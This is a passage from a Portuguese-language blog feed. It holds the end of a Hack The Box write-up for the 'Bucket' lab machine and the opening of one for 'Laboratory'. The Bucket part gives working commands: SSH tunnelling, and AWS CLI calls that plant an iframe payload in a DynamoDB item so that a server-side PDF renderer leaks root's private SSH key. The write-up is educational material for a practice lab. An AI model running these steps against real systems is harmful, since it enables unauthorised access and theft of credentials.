Hydra &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;https://github.com/vanhauser-thc/thc-hydra&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; finished at 2021-02-26 12:55:40
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Uma vez que tínhamos agora acesso à máquina com as credenciais do usuário &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;roy&lt;/code&gt;, coletei a flag de usuário após me conectar via SSH:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;roy@bucket:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;roy&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;roy&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;roy&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sysadm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
roy@bucket:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt 
&amp;lt;redacted&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;root-flag&quot;&gt;Root flag&lt;/h2&gt;

&lt;p&gt;Com o acesso ao usuário &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;roy&lt;/code&gt; pude validar o acesso aos diretórios &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;project&lt;/code&gt;, que tem aparentemente uma estrutura de um website, além de conseguir com esta conta acessar o conteúdo da aplicação em &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/bucket-app&lt;/code&gt; que possui estrutura bastante similar ao encontrado na pasta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;project&lt;/code&gt;, o qual fiz uma cópia para análise a partir da máquina atacante.&lt;/p&gt;

&lt;p&gt;Analisando o conteúdo de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.php&lt;/code&gt; temos um algo bem interessante: uma função escondida para que sempre que chamada POST na página &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://127.0.0.1:8000&lt;/code&gt; com o parâmetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;action=get_alerts&lt;/code&gt;, é feita uma consulta numa tabela &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;alerts&lt;/code&gt; no DynamoDB em que os valores com Title &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ransonware&lt;/code&gt; são incluídos em um PDF e disponibilizados na pasta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/bucket-app/files/&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'vendor/autoload.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Aws\DynamoDb\DynamoDbClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;REQUEST_METHOD&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;===&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;POST&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;action&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;===&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;get_alerts&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;date_default_timezone_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'America/New_York'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$client&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DynamoDbClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;
            &lt;span class=&quot;s1&quot;&gt;'profile'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'default'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;s1&quot;&gt;'region'&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'us-east-1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;s1&quot;&gt;'version'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'latest'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;s1&quot;&gt;'endpoint'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'http://localhost:4566'&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;

        &lt;span class=&quot;nv&quot;&gt;$iterator&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;getIterator&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Scan'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
            &lt;span class=&quot;s1&quot;&gt;'TableName'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'alerts'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;s1&quot;&gt;'FilterExpression'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;title = :title&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;s1&quot;&gt;'ExpressionAttributeValues'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;:title&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;S&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Ransomware&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$iterator&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.html'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;nb&quot;&gt;file_put_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'files/'&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;data&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;passthru&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; 800 A4 -out files/result.pdf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Uma vez que não temos uma tabela chamada &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;alerts&lt;/code&gt;, conforme já enumerado, precisaremos criá-la com os atributos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;title&lt;/code&gt; e &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;data&lt;/code&gt;, este, por sua vez, com conteúdo HTML a ser renderizado e posteriormente salvo no formato PDF, permitindo a possível obtenção de dados sensíveis da máquina.&lt;/p&gt;

&lt;p&gt;Para os testes iniciais, conforme documentação da AWS disponível &lt;a href=&quot;https://docs.aws.amazon.com/cli/latest/userguide/cli-services-dynamodb.html&quot;&gt;neste link&lt;/a&gt;, criei um script para criação da tabela, inclusão de uma entrada e posterior chamada POST na URL em questão para gerar o arquivo PDF.&lt;/p&gt;

&lt;p&gt;Para simplificar este processo, que está sendo feito da máquina atacante, realizados os seguintes procedimentos:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Na máquina atacante, criado chave RSA (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh-keygen&lt;/code&gt;) e atribuido chave pública dela ao usuário &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;roy&lt;/code&gt; na máquina bucket para que não fosse necessário o uso de senhas durante a autenticação.&lt;/li&gt;
  &lt;li&gt;Na máquina atacante também foi criado o tunelamento da porta local 8000/TCP, a qual foi redirecionada para a porta 8000 na máquina bucket, fazendo o serviço disponível também localmente, o que posteriormente foi possível validar acessando localmente a página conforme evidencia abaixo&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh roy@10.10.10.212 &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 8000:127.0.0.1:8000 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/tiTjm7I.png&quot; alt=&quot;Website 8000/TCP via SSH Tunnel&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Após algumas tentativas, notei que similar ao desafio encontrado durante o upload do shell reverso, os itens criados no DynamoDB também são removidos após algum tempo, logo foi necessário encadear todas as requisições para que tivéssemos tempo para executar a ação imediatamente assim que os recursos estivessem disponíveis, assim como a posterior cópia dos ativos se obtivermos sucesso na chamada.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aws dynamodb create-table &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--table-name&lt;/span&gt; alerts &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--attribute-definitions&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;AttributeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;title,AttributeType&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S &lt;span class=&quot;nv&quot;&gt;AttributeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;data,AttributeType&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--key-schema&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;AttributeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;title,KeyType&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;HASH &lt;span class=&quot;nv&quot;&gt;AttributeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;data,KeyType&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;RANGE &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--provisioned-throughput&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;ReadCapacityUnits&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10,WriteCapacityUnits&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10 &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://s3.bucket.htb &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt; bucket.htb &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
aws dynamodb put-item &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--table-name&lt;/span&gt; alerts &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--item&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{&quot;title&quot;: {&quot;S&quot;: &quot;Ransomware&quot;},&quot;data&quot;: {&quot;S&quot;: &quot;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Title&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;Head 1&amp;lt;/h1&amp;gt;&amp;lt;p&amp;gt;Content&amp;lt;/p&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&quot;}}'&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--return-consumed-capacity&lt;/span&gt; TOTAL &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://s3.bucket.htb &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt; bucket.htb &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
curl &lt;span class=&quot;nt&quot;&gt;--data&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;action=get_alerts&quot;&lt;/span&gt; http://localhost:8000/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Após algumas tentativas, seguido do desafio do tempo para cópia do arquivo para a máquina atacante, foi possível gerar e copiar o arquivo PDF com base no HTML enviado.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;roy@bucket:/var/www/bucket-app/files&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 16
drwxr-x---+ 2 root root 4096 Feb 26 18:51 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-x---+ 4 root root 4096 Feb 10 12:29 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root   88 Feb 26 18:51 7627.html
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root 1870 Feb 26 18:51 result.pdf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/XLxhZ9W.png&quot; alt=&quot;Bucket HTB - PoC&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Uma vez que conseguimos renderizar o conteúdo desejado, precisamos encontrar uma forma de incluir arquivos na página renderizada e que resulta no PDF, de modo a dar continuidade na exploração.&lt;/p&gt;

&lt;p&gt;A forma mais fácil de obter o root flag seria importar o arquivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/root/root.txt&lt;/code&gt;, porém isso não nos dá um shell reverso de fato. Seguindo o exemplo da máquina &lt;a href=&quot;/writeup/2021/03/htb-passage/&quot;&gt;&lt;strong&gt;Passage&lt;/strong&gt;&lt;/a&gt;, podemos buscar por um arquivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/root/.ssh/id_rsa&lt;/code&gt; e nos conectar à máquina via shell interativo, porém nosso maior problema no momento é inserir o conteúdo destes em um arquivo HTML.&lt;/p&gt;

&lt;p&gt;Após algumas pesquisas, a forma mais simples de alcançar este objetivo sem o uso de Javascript é utilizando um &lt;strong&gt;iframe&lt;/strong&gt;, onde as alterações, para a qual incluí a tag &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;iframe src=&quot;/root/.ssh/id_rsa&quot; seamless&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code&gt; no HTML utilizado anteriormente, conforme chamadas abaixo:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aws dynamodb create-table &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--table-name&lt;/span&gt; alerts &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--attribute-definitions&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;AttributeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;title,AttributeType&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S &lt;span class=&quot;nv&quot;&gt;AttributeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;data,AttributeType&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--key-schema&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;AttributeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;title,KeyType&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;HASH &lt;span class=&quot;nv&quot;&gt;AttributeName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;data,KeyType&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;RANGE &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--provisioned-throughput&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;ReadCapacityUnits&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10,WriteCapacityUnits&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10 &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://s3.bucket.htb &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt; bucket.htb &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
aws dynamodb put-item &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--table-name&lt;/span&gt; alerts &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--item&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{&quot;title&quot;: {&quot;S&quot;: &quot;Ransomware&quot;},&quot;data&quot;: {&quot;S&quot;: &quot;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Title&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;Head 1&amp;lt;/h1&amp;gt;&amp;lt;iframe src=\&quot;/root/.ssh/id_rsa\&quot; seamless&amp;gt;&amp;lt;/iframe&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&quot;}}'&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--return-consumed-capacity&lt;/span&gt; TOTAL &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--endpoint-url&lt;/span&gt; http://s3.bucket.htb &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt; bucket.htb &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
curl &lt;span class=&quot;nt&quot;&gt;--data&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;action=get_alerts&quot;&lt;/span&gt; http://localhost:8000/    
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Após o procedimento foi possível baixar o aquivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/bucket-app/files/result.pdf&lt;/code&gt; e, com o conteúdo presente neste arquivo, criar o arquivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt;, o qual foi posteriormente utilizado para conectar-se à máquina via SSH e obter a shell a partir do usuário &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@bucket:~# &lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
root@bucket:~# &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt
&amp;lt;redacted&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Espero que tenham gostado!&lt;/p&gt;

&lt;p&gt;Vejo vocês novamente em breve no próximo post! :smiley:&lt;/p&gt;</content><author><name>Davi Cruz</name></author><category term="Writeup" /><category term="HackTheBox" /><category term="htb-medium" /><category term="htb-linux" /><summary type="html">Olá pessoal! A máquina desta semana será Bucket, outra máquina classificada como mediana do Hack The Box, criada por MrR3boot.</summary></entry><entry><title type="html">Hackthebox write-up: Laboratory</title><link href="https://davicruz.com/writeup/2021/04/htb-laboratory/" rel="alternate" type="text/html" title="Hackthebox write-up: Laboratory" /><published>2021-04-17T13:00:00-03:00</published><updated>2021-04-17T13:00:00-03:00</updated><id>https://davicruz.com/writeup/2021/04/htb-laboratory</id><content type="html" xml:base="https://davicruz.com/writeup/2021/04/htb-laboratory/">&lt;p&gt;Olá pessoal!&lt;/p&gt;

&lt;p&gt;A máquina desta semana será &lt;strong&gt;Laboratory&lt;/strong&gt;, outra máquina Linux classificada como fácil do &lt;a href=&quot;https://www.hackthebox.eu&quot;&gt;Hack The Box&lt;/a&gt;, criada por &lt;a href=&quot;https://app.hackthebox.eu/users/73268&quot;&gt;0xc45&lt;/a&gt;. &lt;!--more--&gt;&lt;/p&gt;

&lt;p class=&quot;notice--info&quot;&gt;:information_source: &lt;strong&gt;Info&lt;/strong&gt;: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/6fqKuas.png&quot; alt=&quot;HTB Laboratory&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;enumeração&quot;&gt;Enumeração&lt;/h2&gt;

&lt;p&gt;Conforme de costume, iniciamos com a enumeração básica dos serviços utilizando o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; com um quick scan:&lt;/p&gt;

